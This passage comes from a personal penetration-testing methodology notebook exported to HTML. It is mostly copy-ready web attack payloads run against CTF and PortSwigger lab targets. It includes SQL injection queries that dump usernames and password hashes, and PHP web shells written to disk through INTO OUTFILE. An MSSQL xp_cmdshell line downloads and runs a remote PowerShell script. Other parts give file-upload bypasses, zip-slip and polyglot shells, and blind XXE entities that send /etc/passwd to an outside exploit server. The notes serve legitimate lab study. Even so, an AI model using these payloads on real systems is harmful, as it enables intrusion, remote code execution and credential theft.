columns:</span></p><p>&#39; order by 1--</p><p>&#39; order by 2--</p><p>&#39; order by 3--</p><p><span style="color:#3f4043;">(Go until it it errors out. Now you know how many columns there are.)</span></p><p></p><p><a href="http://10.11.1.222:8080/blog/">http://10.11.1.222:8080/blog/</a></p><p>&#39; or 1=1 --</p><p></p><p><a href="http://10.11.1.222:8080/blog/home.jsp">http://10.11.1.222:8080/blog/home.jsp</a></p><p></p><p><span style="color:#3f4043;">(there&#39;s 3 columns)</span></p><p>&#39; order by 1--</p><p>&#39; order by 2--</p><p>&#39; order by 3--</p><p>&#39; order by 4-- <span style="color:#3f4043;">(errors out here)</span></p><p></p><p></p><p><span style="color:#3f4043;">(something lol)</span></p><p>&#39; UNION select &#39;a&#39;, + &#39;a&#39; from DUAL--</p><p></p><p><span style="color:#3f4043;">(lists names of tables)</span></p><p>&#39; UNION SELECT NULL, table_name, NULL FROM all_tables--</p><p></p><p><span style="color:#3f4043;">(lists names of columns inside set table)</span></p><p>&#39; UNION SELECT NULL, column_name, NULL FROM all_tab_columns WHERE table_name = &#39;WEB_USERS&#39;--</p><p>&#39; UNION SELECT NULL, column_name, NULL FROM all_tab_columns WHERE table_name = &#39;WEB_ADMINS&#39;--</p><p></p><p><span style="color:#3f4043;">(lists information inside of set column inside set table)</span></p><p>&#39; UNION select USER_NAME, NULL, NULL from WEB_USERS --</p><p><img src="images/354-1.png" alt="images/354-1.png" /></p><p>&#39; UNION select PASSWORD, NULL, NULL from WEB_USERS --</p><p><img src="images/354-2.png" alt="images/354-2.png" /></p><p>&#39; UNION select PASSWORD, ADMIN_NAME, ADMIN_ID from WEB_ADMINS --</p><p></p><p></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SQLI--MySQL_431.html"></a><h1 class='title level-6'>MySQL</h1><br/><p>@</p><p></p><p></p><p></p><p></p><p>Testing for SQLI and determining columns:</p><p></p><p>blog=1 UNION SELECT NULL--</p><p><img src="images/431-1.png" alt="images/431-1.png" /></p><p>blog=1 UNION SELECT NULL,NULL--</p><p><img src="images/431-2.png" alt="images/431-2.png" /></p><p>blog=1 UNION SELECT NULL,NULL--</p><p><img src="images/431-3.png" alt="images/431-3.png" /></p><p>AND BAM, We can see it&#39;s reflecting our response in this UNION query. </p><p></p><p></p><p>So we now know this is vulnerable to SQLI injection and that it contains 3 columns. </p><p></p><p></p><p></p><p>?blog=-23232 union select null,null,@@version--</p><p><img src="images/431-4.png" alt="images/431-4.png" /></p><p></p><p>By using a page that doesn&#39;t exist in the blog paramater, the MySQL resposnse gets reflected in the status section</p><p></p><p><img src="images/431-5.png" alt="images/431-5.png" /></p><p>As you can see; this is not the information we seek. </p><p></p><p><img src="images/431-6.png" alt="images/431-6.png" /></p><p></p><p>?blog=-51512 UNION SELECT null, username, password from users--</p><p><img src="images/431-7.png" alt="images/431-7.png" /></p><p></p><p>?blog=-51512 union select NULL, NULL, group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata--</p><p><img src="images/431-8.png" alt="images/431-8.png" /></p><p></p><p>Very interesting technique. </p><p></p><p></p><p></p><p>?blog=-51512 union select NULL, NULL, group_concat(password) from users--</p><p><img src="images/431-9.png" alt="images/431-9.png" /></p><p></p><p></p><p>?blog=-51512 union select NULL, group_concat(username), group_concat(password) from users--</p><p><img src="images/431-10.png" alt="images/431-10.png" /></p><p>?blog=-51512 union select NULL,NULL,group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=&#39;vn_admin&#39;--</p><p><img src="images/431-11.png" alt="images/431-11.png" /></p><p></p><p>?blog=-51512 union select NULL, NULL, group_concat(table_name, &#39;:&#39;, column_name) from INFORMATION_SCHEMA.columns where table_schema=&#39;vn_admin&#39;--</p><p><img src="images/431-12.png" alt="images/431-12.png" /></p><p></p><p>?blog=-51512 union select NULL,NULL,group_concat(username) from vn_admin.be_users--</p><p><img src="images/431-13.png" alt="images/431-13.png" /></p><p></p><p>?blog=-51512 union select NULL,NULL,group_concat(password) from vn_admin.be_users--</p><p><img src="images/431-14.png" alt="images/431-14.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SQLI--MySQL--SQLI_cheat_sheet_442.html"></a><h1 class='title level-7'>SQLI cheat sheet</h1><br/><p><span style="color:#3f4043;">Basic SQLI check in url paramater:</span></p><p><a href="http://marketplace.thm/admin?user=3">http://marketplace.thm/admin?user=3</a> or 1=1;--</p><p><a href="http://marketplace.thm/admin?user=3'">http://marketplace.thm/admin?user=3&#39;</a></p><p></p><p><span style="color:#3f4043;">Determining Columns: </span></p><p><a href="http://marketplace.thm/admin?user=-3">http://marketplace.thm/admin?user=-3</a> UNION SELECT NULL, NULL, NULL, NULL;--</p><p></p><p>&#39;UNION SELECT NULL--</p><p>&#39;UNION SELECT NULL, NULL--</p><p>&#39;UNION SELECT NULL, NULL, NULL--</p><p>&#39;UNION SELECT NULL, NULL, NULL, NULL--</p><p></p><p><span style="color:#3f4043;">Figuring out data type and what can be displayed back to us:</span></p><p>&#39;UNION SELECT &#39;a&#39;, NULL, NULL, NULL--</p><p>&#39;UNION SELECT NULL, &#39;a&#39;, NULL, NULL--</p><p>&#39;UNION SELECT NULL, NULL, &#39;a&#39;, NULL--</p><p>&#39;UNION SELECT NULL, NULL, NULL ‘a’--</p><p></p><p><span style="color:#3f4043;">Retrieving basic information:</span></p><p>http://marketplace.thm/admin?user=-3 UNION SELECT @@version, NULL, NULL, NULL;--</p><p>http://marketplace.thm/admin?user=-3 UNION SELECT @@hostname, NULL, NULL, NULL;--</p><p>http://marketplace.thm/admin?user=-3 UNION SELECT database(), NULL, NULL, NULL;--</p><p>http://marketplace.thm/admin?user=-3 UNION SELECT user(), NULL, NULL, NULL;--</p><p>http://marketplace.thm/admin?user=-3 UNION SELECT system_user(), NULL, NULL, NULL;--</p><p>http://marketplace.thm/admin?user=-3 UNION SELECT host, user, password, NULL from mysql.user;--   <span style="color:#3f4043;">(might not have privs)</span></p><p></p><p><span style="color:#3f4043;">See all tablenames from all databases: (Usually start looking at bottom with this technique)</span> <span style="color:#3f4043;">(Use json_arrayagg over group_concat usually as it has much larget text limit)</span></p><p>http://marketplace.thm/admin?user=-3 UNION SELECT json_arrayagg(concat_ws(0x3a, table_name, table_schema)), null,null,null from INFORMATION_SCHEMA.tables;--</p><p>	</p><p><span style="color:#3f4043;">See tablenames from a selected database:</span></p><p>http://marketplace.thm/admin?user=-3 UNION SELECT json_arrayagg(concat_ws(0x3a, table_name, table_schema)), null,null,null from INFORMATION_SCHEMA.tables where table_schema=&#39;marketplace&#39;;--</p><p></p><p><span style="color:#3f4043;">See columns and tablenames from selected database:</span></p><p>http://marketplace.thm/admin?user=-3 UNION SELECT json_arrayagg(concat_ws(0x3a, table_name, column_name)), null,null,null from INFORMATION_SCHEMA.columns where table_schema=&#39;marketplace&#39;;--</p><p></p><p><span style="color:#3f4043;">If you&#39;re insane and wanna see all columns from all tables from all databases:</span></p><p>http://marketplace.thm/admin?user=-3 UNION SELECT json_arrayagg(concat_ws(0x3a, table_name, column_name, table_schema)), null,null,null from INFORMATION_SCHEMA.columns;--</p><p></p><p><span style="color:#3f4043;">List rows from the users table from the marketplace database:</span></p><p>http://marketplace.thm/admin?user=-3 UNION SELECT json_arrayagg(concat_ws(0x3a, password)), null,null,null from marketplace.users;--</p><p></p><p><span style="color:#3f4043;">List many rows from the messages table from the marketplace database: (PRO TIP: use gedit here to cut text so less writing is required)</span></p><p><a href="http://marketplace.thm/admin?user=-3">http://marketplace.thm/admin?user=-3</a> UNION SELECT json_arrayagg(concat_ws(0x3a, id, is_read, message_content, user_from, user_to)), null,null,null from marketplace.messages;--</p><p></p><p></p><p></p><p><span style="color:#3f4043;">SQLI to RCE:</span></p><p>UNION SELECT NULL, NULL, NULL,&quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;,6 into OUTFILE &#39;c:/inetpub/wwwroot/backdoor.php&#39;</p><p>UNION SELECT NULL, NULL, NULL,&quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;,6 into OUTFILE &#39;/var/www/backdoor.php&#39;</p><p>UNION SELECT NULL, NULL, NULL,&quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;,6 into OUTFILE &#39;/var/www/html/backdoor.php&#39;</p><p><a href="http://10.10.123.31/backdoor.php?cmd=whoami">http://10.10.123.31/backdoor.php?cmd=whoami</a></p><p></p><p>http://marketplace.thm/admin?user=-3 UNION SELECT NULL, &quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;, NULL, NULL into OUTFILE &#39;c:/inetpub/wwwroot/backdoor.php&#39;;--</p><p></p><p><span style="color:#3f4043;">(Needs certain permissions in place so testing is needed)</span></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SQLI--MySQL--SQLI_cheat_sheet--parsing_dump_445.html"></a><h1 class='title level-8'>parsing dump</h1><br/><p><span style="color:#3f4043;">Dumps all tables, columns, and databases :DDDDDDDDDDD</span></p><p>search=GUNe&#39; UNION SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,table_name,column_name,table_schema)),NULL,NULL,NULL,NULL,NULL,NULL from INFORMATION_SCHEMA.columns#&amp;submit=</p><p></p><p><span style="color:#3f4043;">Parsing dump:</span></p><p>Inspect, Copy all from here, and save it to file called dump </p><p><img src="images/445-1.png" alt="images/445-1.png" /></p><p></p><p></p><p><span style="color:#3f4043;">Parse all dump to cleaner format:</span></p><p>cat dump | tr &#39;,&#39; &#39;\n&#39; &gt; formatted_dump.txt</p><p></p><p><span style="color:#3f4043;">Hunt for where credentials are stored:</span></p><p> cat formatted_dump.txt | grep -i pass  </p><p><img src="images/445-2.png" alt="images/445-2.png" /></p><p></p><p><img src="images/445-3.png" alt="images/445-3.png" /></p><p></p><p><img src="images/445-4.png" alt="images/445-4.png" /></p><p></p><p>search=&#39; UNION ALL SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,user_name,user_password)),NULL,NULL,NULL,NULL,NULL,NULL from olympus.users#&amp;submit=</p><p></p><p></p><p></p><p>&#39; UNION ALL SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,user_name,user_password)),NULL,NULL,NULL,NULL,NULL,NULL from olympus.users#</p><p>[&quot;prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C&quot;, &quot;root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK&quot;, &quot;zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC&quot;]</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SQLI--MySQL--SQLI_cheat_sheet--payloads_714.html"></a><h1 class='title level-8'>payloads</h1><br/><p>&#39; or 1=1-- </p><p>&quot; or 1=1--</p><p>&#39;) or &#39;1&#39;=&#39;1--</p><p>&quot;) or &quot;1&quot;=&quot;1--</p><p>&#39;)) or ((&#39;1&#39;= &#39;1</p><p>&quot;)) or ((&quot;1&quot;= &quot;1</p><p>&quot; or sleep(10)#</p><p>&#39;;select sleep(5)-- -</p><p>&#39; or sleep(10)#</p><p>&quot; or sleep(10)#</p><p>&#39; union select 1,2,3-- -</p><p>&quot; union select 1,2,3-- -</p><p>&#39; union select null,version()--</p><p>&quot; union select null,version()--</p><p>&#39; and 1=(SELECT COUNT(*) FROM tabname); --</p><p>&quot; and 1=(SELECT COUNT(*) FROM tabname); --</p><p>&#39; or exists(select * from users)--</p><p>&quot; or exists(select * from users)--</p><p>&#39; or sleep(5)=1--</p><p>&quot; or sleep(5)=1--</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SQLI--MSSQL_432.html"></a><h1 class='title level-6'>MSSQL</h1><br/><p></p><p><span style="color:#3f4043;">Determining Columns: </span></p><p>&#39;UNION SELECT NULL--</p><p>&#39;UNION SELECT NULL, NULL--</p><p>&#39;UNION SELECT NULL, NULL, NULL--</p><p>&#39;UNION SELECT NULL, NULL, NULL, NULL--</p><p></p><p>&#39;union order by 1--</p><p>&#39;union order by 2--</p><p>&#39;union order by 3--</p><p>&#39;union order by 4--</p><p></p><p>&#39;UNION ALL SELECT 1;--</p><p>&#39;UNION ALL SELECT 1,2;--</p><p>&#39;UNION ALL SELECT 1,2,3;--</p><p>&#39;UNION ALL SELECT 1,2,3,4;--</p><p></p><p><span style="color:#3f4043;">Figuring out data type and what can be displayed back to us:</span></p><p>&#39;UNION SELECT &#39;a&#39;, NULL, NULL--</p><p>&#39;UNION SELECT NULL, &#39;a&#39;, NULL--</p><p>&#39;UNION SELECT NULL, NULL, &#39;a&#39;--</p><p></p><p><span style="color:#3f4043;">Abusing stacked queries for code execution: </span></p><p>o&#39;union select is_srvrolemember(&#39;sysadmin&#39;),2; EXEC sp_configure &#39;show advanced options&#39;, 1;--</p><p>o&#39;union select is_srvrolemember(&#39;sysadmin&#39;),2; EXEC sp_configure &#39;xp_cmdshell&#39;, 1;--</p><p>&#39;union select name,2 from master..sysdatabases; RECONFIGURE;--</p><p>&#39;RECONFIGURE;--</p><p></p><p>&#39;union select name,2 from master..sysdatabases; EXEC xp_cmdshell &#39;powershell -c iex (iwr -usebasicparsing <a href="http://192.168.119.239/rev3.ps1)';--">http://192.168.119.239/rev3.ps1)&#39;;--</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SQLI--SQLMap_559.html"></a><h1 class='title level-6'>SQLMap</h1><br/><p>sqlmap -u olympus.thm/~webmaster/search.php --batch --method=POST --forms --crawl=2 </p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--File_upload_373.html"></a><h1 class='title level-5'>File upload</h1><br/><p><a href="https://infosecwriteups.com/bypass-server-upload-restrictions-69054c5e1be4">https://infosecwriteups.com/bypass-server-upload-restrictions-69054c5e1be4</a></p><p><a href="https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass">https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass</a></p><p></p><p></p><p><h3>Bypass restrictions:</h3></p><p><span style="color:#234141;">Some of my favorites so far is:</span></p><p></p><p>gedit cmd.php</p><p></p><p>GIF89a; &lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;</p><p></p><p></p><p><span style="color:#234141;">Double extensions (sometimes the webserver only reads the first extension, but actually the latter is what&#39;s being exectuted)</span></p><p>revshell.jpg.php</p><p></p><p><span style="color:#234141;">Use uncommon extension variations of a certain extension + Mixing uppercase and lowercase method: </span></p><p>Extension examples to use: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md#defaults-extensions">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md#defaults-extensions</a></p><p></p><p><span style="color:#234141;">Magic bytes:</span></p><p><span style="color:#234141;">You can replace(or sometimes just add at the start of file) the first bytes in a file using hexeditor to a file extension that is accepted in the web application you want to bypass. So in practice sometimes you could upload php reverse shell and then exectute it later, but the web application read it as a .png, .gif, or .jpg for instance. These are common ones to be accepted. </span> </p><p></p><p><span style="color:#3f4043;">You could try something like: </span></p><p></p><p>../../../rev.php</p><p>../../../../var/www/html/rev.php</p><p>../../../../var/www/html/rev.php%00.png</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--File_upload--zip_slip_476.html"></a><h1 class='title level-6'>zip slip</h1><br/><p><h3>zip slip attack:</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><a href="https://youtu.be/kE36IGAU5rg?t=1108">https://youtu.be/kE36IGAU5rg?t=1108</a></p><p></p><p></p><p>cd /var/www/html</p><p>gedit webshell.php</p><p></p><p>&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;</p><p></p><p>zip zipslip.zip ../../../../../../../../var/www/html/webshell.php</p><p>7z l zipslip.zip</p><p><img src="images/476-1.png" alt="images/476-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--File_upload--.access_mime_type_technique_508.html"></a><h1 class='title level-6'>.access mime type technique</h1><br/><p><a href="https://www.youtube.com/watch?v=xZd1JWmLGLk">https://www.youtube.com/watch?v=xZd1JWmLGLk</a></p><p></p><p><span style="color:#3f4043;">If you have file upload, but php files are disallowed, then try this technique.</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">It can make apache interpret arbitrary files as php codes with the usage of uploading a .access file to potentially change configuration settings on server side. </span></p><p></p><p>echo ‘AddType application/x-httpd-php.cth’ &gt; .htaccess</p><p></p><p><span style="color:#3f4043;">then upload file to server</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">then grab a php webshell and call it anyname.cth and this could potentially allow your php code now to execute!</span></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--File_upload--nullbyte_669.html"></a><h1 class='title level-6'>nullbyte</h1><br/><p>Nullbyte method:</p><p></p><p>filename=&quot;exploit.php%00.jpg&quot;</p><p></p><p></p><p><h3>Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn&#39;t applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip </h3><code>.php</code><h3> from the following filename:</h3></p><p><code>exploit.p</code><code><span style="color:#ff6633;">.php</span></code><code>hp</code></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--File_upload--Polyglot_web_shell_634.html"></a><h1 class='title level-6'>Polyglot web shell</h1><br/><p><h3>A polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows: </h3></p><p></p><p>exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; /home/kali/Downloads/door.jpg -o polyglot.php</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--File_upload--Race_condition_676.html"></a><h1 class='title level-6'>Race condition</h1><br/><p>In this lab the php script saves stores the file  before it checks extension and then deletes it. If we send a request just milliseconds before it gets check and delted, we can retrieve and execute the file in its php extension. This technique is exploiting a race condition weakness in the code. </p><p></p><p>We will be using turbo intruder to achieve this. Few tools can be fast enough. </p><p></p><p><img src="images/676-1.png" alt="images/676-1.png" /></p><p></p><p>Here we are reading the /home/carlos/secret through php file_get_contents </p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--File_upload--Race_condition--Turbo_Intruder_code_677.html"></a><h1 class='title level-7'>Turbo Intruder code</h1><br/><p>I started off using the test.py module.</p><p></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># This is just for making sure the engine works during development</span><br /><span style="color:#0088ff;font-weight:400"># Launch with java -jar build/libs/turbo-intruder-all.jar resources/examples/test.py /dev/null z z</span><br /><span style="color:#ff9d00;font-weight:700">def</span> <span style="color:#333333;font-weight:400">queueRequests</span>(target, wordlists):<br />    engine = RequestEngine(endpoint=<span style="color:#3ad900;font-weight:400">&#39;https://0ab300540400b7ebc016c718006200a4.web-security-academy.net:443&#39;</span>,<br />                           concurrentConnections=<span style="color:#ff0044;font-weight:400">2</span>,<br />                           requestsPerConnection=<span style="color:#ff0044;font-weight:400">10</span>,<br />                           pipeline=<span style="color:#ff0044;font-weight:400">False</span><br />                           )<br /><br />    noPayload = <span style="color:#3ad900;font-weight:400">&#39;&#39;&#39;POST /my-account/avatar HTTP/2<br />Host: 0ab300540400b7ebc016c718006200a4.web-security-academy.net<br />Cookie: session=o5g8B4eroNhmwV0Knwvn36O47HQtUcrU<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Content-Type: multipart/form-data; boundary=---------------------------69542980738213777741386124383<br />Content-Length: 533<br />Origin: https://0ab300540400b7ebc016c718006200a4.web-security-academy.net<br />Referer: https://0ab300540400b7ebc016c718006200a4.web-security-academy.net/my-account<br />Upgrade-Insecure-Requests: 1<br />Sec-Fetch-Dest: document<br />Sec-Fetch-Mode: navigate<br />Sec-Fetch-Site: same-origin<br />Sec-Fetch-User: ?1<br />Te: trailers<br /><br />-----------------------------69542980738213777741386124383<br />Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;2.php&quot;<br />Content-Type: image/jpeg<br /><br /><br />&lt;?php echo file_get_contents(&#39;/home/carlos/secret&#39;); ?&gt;<br />-----------------------------69542980738213777741386124383<br />Content-Disposition: form-data; name=&quot;user&quot;<br /><br />wiener<br />-----------------------------69542980738213777741386124383<br />Content-Disposition: form-data; name=&quot;csrf&quot;<br /><br />DBT35uWFYFIko3I8funzWmmyBNDjQYvW<br />-----------------------------69542980738213777741386124383--<br /><br />&#39;&#39;&#39;</span><br />    engine.queue(noPayload)<br /><br />    onePayload = <span style="color:#3ad900;font-weight:400">&#39;&#39;&#39;GET /files/avatars/2.php HTTP/2<br />Host: 0ab300540400b7ebc016c718006200a4.web-security-academy.net<br />Cookie: session=o5g8B4eroNhmwV0Knwvn36O47HQtUcrU<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Upgrade-Insecure-Requests: 1<br />Sec-Fetch-Dest: document<br />Sec-Fetch-Mode: navigate<br />Sec-Fetch-Site: none<br />Sec-Fetch-User: ?1<br />Te: trailers<br /><br /><br /><br />&#39;&#39;&#39;</span><br />    engine.queue(onePayload)<br /><br /><br /><span style="color:#ff9d00;font-weight:700">def</span> <span style="color:#333333;font-weight:400">handleResponse</span>(req, interesting):<br />    table.add<span style="color:#000000;font-weight:400">(</span>req<span style="color:#000000;font-weight:400">)</span></pre></div></p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks_457.html"></a><h1 class='title level-5'>XML attacks</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XPath_Injection_489.html"></a><h1 class='title level-6'>XPath Injection</h1><br/><p><span style="color:#3f4043;">XPath Injection:</span></p><p></p><p><a href="https://www.youtube.com/watch?v=rFXDr5KVdAc&list=PLIbCFt2m6LvIKx64BiAL32Mbxb1P6GtEg&index=3">https://www.youtube.com/watch?v=rFXDr5KVdAc&amp;list=PLIbCFt2m6LvIKx64BiAL32Mbxb1P6GtEg&amp;index=3</a></p><p><span style="color:#3f4043;">(If you see xml tags etc on webpage, attempt XPath Injection to bypass authentification, and also test other places too. like get requests etc)</span></p><p></p><p>&#39;or&#39;1&#39;=&#39;1</p><p>&#39;or&#39;true()&#39;or&#39;</p><p>a&#39; or true() or &#39;</p><p></p><p>&#39; or &#39;1&#39;=&#39;1</p><p>&#39; or &#39;&#39;=&#39;</p><p>x&#39; or 1=1 or &#39;x&#39;=&#39;y</p><p>/</p><p>//</p><p>//*</p><p>*/*</p><p>@*</p><p>count(/child::node())</p><p>x&#39; or name()=&#39;username&#39; or &#39;x&#39;=&#39;y</p><p>&#39; and count(/*)=1 and &#39;1&#39;=&#39;1</p><p>&#39; and count(/@*)=1 and &#39;1&#39;=&#39;1</p><p>&#39; and count(/comment())=1 and &#39;1&#39;=&#39;1</p><p>search=&#39;)] | //user/*[contains(*,&#39;</p><p>search=Har&#39;) and contains(../password,&#39;c</p><p>search=Har&#39;) and starts-with(../password,&#39;c</p><p>&#39; or 1]%00</p><p></p><p></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection</a></p><p><a href="https://stackoverflow.com/questions/201568/when-would-i-use-xml-instead-of-sql">https://stackoverflow.com/questions/201568/when-would-i-use-xml-instead-of-sql</a></p><p><a href="https://github.com/orf/xcat">https://github.com/orf/xcat</a></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XXE_490.html"></a><h1 class='title level-6'>XXE</h1><br/><p><span style="color:#3f4043;">for XXE check:</span></p><p></p><p><span style="color:#3f4043;">Change content type to xml and see how it responds. If it gives xml error, then try xxe</span></p><p></p><p><a href="https://www.hackingarticles.in/mustacchio-tryhackme-walkthrough/">https://www.hackingarticles.in/mustacchio-tryhackme-walkthrough/</a></p><p></p><p><a href="https://portswigger.net/web-security/xxe/blind">https://portswigger.net/web-security/xxe/blind</a> (learn)</p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XXE--Basic_638.html"></a><h1 class='title level-7'>Basic</h1><br/><p><span style="color:#3f4043;">View files through XXE:</span></p><p></p><p></p><p>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</p><p>&lt;!DOCTYPE foo [ &lt;!ELEMENT data ANY &gt;</p><p>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</p><p>&lt;stockCheck&gt;</p><p>&lt;productId&gt;</p><p>	1&amp;xxe;</p><p>&lt;/productId&gt;</p><p>&lt;storeId&gt;</p><p>	1</p><p>&lt;/storeId&gt;</p><p>&lt;/stockCheck&gt;</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XXE--File_Read_DTD_Error_Messages_640.html"></a><h1 class='title level-7'>File Read DTD Error Messages</h1><br/><p><span style="color:#3f4043;">In Burp:</span></p><p>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;<a href="https://exploit-0a3a008003341db7c0583a26017100e5.exploit-server.net/exploit.dtd">https://exploit-0a3a008003341db7c0583a26017100e5.exploit-server.net/exploit.dtd</a>&quot;&gt; %xxe;]&gt;</p><p></p><p><span style="color:#3f4043;">Exploit Server:</span></p><p>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</p><p>&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;file:///invalid/%file;&#39;&gt;&quot;&gt;</p><p>%eval;</p><p>%exfil</p><p></p><p>  </p><p><img src="images/640-1.png" alt="images/640-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XXE--Blind_XXE_External_DTD_635.html"></a><h1 class='title level-7'>Blind XXE External DTD</h1><br/><p><span style="color:#3f4043;">In Burp:</span></p><p>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM</p><p>&quot;<a href="https://exploit-0a41009803a8ea33c00e262901da0065.exploit-server.net/exploit.dtd">https://exploit-0a41009803a8ea33c00e262901da0065.exploit-server.net/exploit.dtd</a>&quot;&gt; %xxe;]&gt;</p><p></p><p><span style="color:#3f4043;">In Exploit Server:</span></p><p><div class="codebox"><pre>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br />&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;https://exploit-0a41009803a8ea33c00e262901da0065.exploit-server.net/exploit?x=%file;&#39;&gt;&quot;&gt;<br />%eval;<br />%exfil;</pre></div></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XXE--XXE_RCE_if_lucky_636.html"></a><h1 class='title level-7'>XXE RCE if lucky</h1><br/><p><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></p><p></p><p><span style="color:#3f4043;">If fortune is on our side, and the PHP “expect” module is loaded, we can get RCE. Let’s modify the payload</span></p><p></p><p><div class="codebox"><pre>&lt;?xml <span style="color:#333333;font-weight:400">version=</span><span style="color:#3ad900;font-weight:400">&quot;1.0&quot;</span> <span style="color:#333333;font-weight:400">encoding=</span><span style="color:#3ad900;font-weight:400">&quot;ISO-8859-1&quot;</span>?&gt;<br /><span style="color:#333333;font-weight:400">&lt;!DOCTYPE</span> <span style="color:#333333;font-weight:400">foo</span><br />  <span style="color:#333333;font-weight:400">[&lt;!ELEMENT</span> foo ANY <span style="color:#333333;font-weight:400">&gt;</span><br />   <span style="color:#333333;font-weight:400">&lt;!ENTITY xxe</span> <span style="color:#333333;font-weight:400">SYSTEM</span> <span style="color:#3ad900;font-weight:400">&quot;expect://id&quot;</span> <span style="color:#333333;font-weight:400">&gt;]&gt;</span><br />&lt;creds&gt;<br />  &lt;user&gt;`<span style="color:#ffdd00;font-weight:400">&amp;xxe;</span>`&lt;/user&gt;<br />  &lt;pass&gt;`mypass`&lt;/pass&gt;<br />&lt;/creds&gt;</pre></div></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XXE--XXE_SSRF_637.html"></a><h1 class='title 